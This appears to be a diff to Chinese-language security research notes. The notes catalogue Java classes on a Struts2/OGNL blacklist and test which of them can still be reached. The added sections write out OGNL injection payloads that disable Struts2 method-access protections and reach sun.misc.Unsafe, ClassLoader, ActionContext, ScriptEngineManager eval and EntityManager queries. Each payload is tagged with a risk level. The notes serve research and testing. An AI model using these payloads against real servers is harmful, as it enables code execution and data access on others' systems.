@@ -27,7 +27,6 @@
     - [24 = "java.lang.Class"](#24--javalangclass)
     - [25 = "java.lang.RuntimePermission"](#25--javalangruntimepermission)
     - [26 = "javax.servlet.ServletContext"](#26--javaxservletservletcontext)
-    - [27 = "java.lang.ClassLoader"](#27--javalangclassloader)
 
 
 # unsafePropertyNames
@@ -43,12 +42,13 @@
   // high risk
   // 但不能这么用，会抛异常
   %{#_memberAccess.allowStaticMethodAccess=true,
-  #context["xwork.MethodAccessor.denyMethodExecution"]=false,
-  @sun.misc.Unsafe@getUnsafe()}
+    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
+    @sun.misc.Unsafe@getUnsafe()}
 
+  // medium risk
   %{#_memberAccess.allowStaticMethodAccess=true,
     #context["xwork.MethodAccessor.denyMethodExecution"]=false,
-    #f=@sun.misc.Unsafe@class.getDeclaredField("theUnsafe"),
+    #f=@sun.misc.Unsafe.class.getDeclaredField("theUnsafe"),
     #f.setAccessible(true),
     #unsafe=#f.get(null)}
   ```
@@ -73,7 +73,7 @@
   // high risk
   %{#_memberAccess.allowStaticMethodAccess=true,
     #context["xwork.MethodAccessor.denyMethodExecution"]=false,
-    #a=new java.lang.Class().getClassLoader()}
+    #a=new java.lang.String("test").getClass().getClassLoader()}
   ```   
   ![](./imgs/chop-01-001.png)
 
@@ -106,6 +106,17 @@
 
 ### 4 = "com.opensymphony.xwork.ActionContext"
 * strut2 框架的包
+* src-code  
+  [Jump to ActionContext](./assets/ActionContext.java)
+* payload
+  ```js
+  // high risk
+  %{@com.opensymphony.xwork.ActionContext@getContext()}
+
+  %{#_memberAccess.allowStaticMethodAccess=true,
+    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
+    #a=new com.opensymphony.xwork.ActionContext()}
+  ```
 
 
 ### 5 = "java.lang.Compiler"
@@ -160,6 +171,7 @@
 
 
 ### 6 = "com.atlassian.applinks.api.ApplicationLinkRequestFactory"
+* [atlassian doc](https://docs.atlassian.com/applinks-api/3.2/com/atlassian/applinks/api/ApplicationLinkRequestFactory.html)
 
 
 ### 7 = "java.lang.Thread"
@@ -265,6 +277,9 @@
 
 
 ### 17 = "org.apache.tomcat.InstanceManager"
+* 这是一个接口，不能实例化
+* src-code  
+  [Jump to InstanceManager](./assets/InstanceManager.java)
 
 
 ### 18 = "java.lang.Runtime"
@@ -289,12 +304,72 @@
 
 
 ### 19 = "javax.script.ScriptEngineManager"
+* [参考 Doc](https://docs.oracle.com/en/java/javase/11/docs/api/java.scripting/javax/script/ScriptEngineManager.html)
+* [参考 cnblogs](https://www.cnblogs.com/kanyun/p/16159710.html)
+* [参考 CSDN](https://blog.csdn.net/qq_25255197/article/details/79072119)
+* ScriptEngineManager 为 ScriptEngine 类实现发现和实例化机制
+* 使用该类来执行 javascript 脚本
+* payload
+  ```js
+  // high risk
+  %{@javax.script.ScriptEngineManager}
+
+  %{#_memberAccess.allowStaticMethodAccess=true,
+    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
+    #a=new javax.script.ScriptEngineManager()}
+
+  %{#a=new javax.script.ScriptEngineManager().getEngineByName().eval("println('hello!')")}
+  ```
+  第一句
+  ![](./imgs/chop-19-001.png)  
+  第二句
+  ![](./imgs/chop-19-002.png)
+  第三句
+  ![](./imgs/chop-19-003.png)
 
 
 ### 20 = "javax.persistence.EntityManager"
+* 这是一个接口，不能实例化
+* 应该是操控数据库的
+* (Spring 中) 通过 EntityManagerFactory 获取 EntityManager 实例。每个线程拥有自己的 EntityManager 实例
+* src-code  
+  [Jump to EntityManager](./assets/EntityManager.java)  
+  [Jump to EntityManagerFactory](./assets/EntityManagerFactory.java)  
+  [Jump to javax.persistence.Persistence](./assets/Persistence.java)
+* [参考 CSDN](https://blog.csdn.net/lvxiangan/article/details/88947430)
+* [参考 cnblogs](https://www.cnblogs.com/yy3b2007com/p/9195903.html)
+* payload
+  ```js
+  // 使用匿名内部类
+  // new 了一个实现接口的匿名类，需要在匿名类内部 (花括号内) 实现接口的方法
+  // 所以下面这个 payload 感觉有问题
+  // high risk
+  %{#_memberAccess.allowStaticMethodAccess=true,
+    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
+    #a=new javax.persistence.EntityManager(){public void clear(){}}.clear()}
+
+  // 尝试先创建 EntityManagerFactory
+  // 然后不带安全权限语句，把一些方法都尝试了
+  // 都是 Normal
+  %{#em=@javax.persistence.Persistence@createEntityManagerFactory("test").createEntityManager(),
+    #em.createQuery("select * from Student")}
+
+  // 带上安全权限语句
+  // 感觉在靶机 (含数据库) 上可能可以形成注入
+  // high risk
+  ```
+  第一句
+  ![](./imgs/chop-20-001.png)  
+  第二句，不带权限语句
+  ![](./imgs/chop-20-002.png)  
+  第三句，带权限语句
+  ![](./imgs/chop-20-003.png)
 
 
 ### 21 = "org.springframework.context.ApplicationContext"
+* 这是一个接口，不能实例化
+* src-code  
+  [Jump to ApplicationContext](./assets/ApplicationContext.java)
 
 
 ### 22 = "java.lang.SecurityManager"
@@ -341,6 +416,16 @@
 
 
 ### 26 = "javax.servlet.ServletContext"
+* 这是一个接口，不能实例化
+* Servlet 容器启动时，会为每个 Web 应用（webapps 下的每个目录都是一个 Web 应用）创建一个唯一的 ServletContext 对象
+* Web 应用中的所有 Servlet 共享同一个 ServletContext，不同 Servlet 之间通过 ServletContext 对象实现数据通讯
+* src-code  
+  [Jump to ServletContext](./assets/ServletContext.java)
+* [参考 biancheng](http://c.biancheng.net/servlet2/servletcontext.html)
+* payload
+* ```js
+  %{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext()}
+  ```
 
 
 ### 27 = "java.lang.ClassLoader"
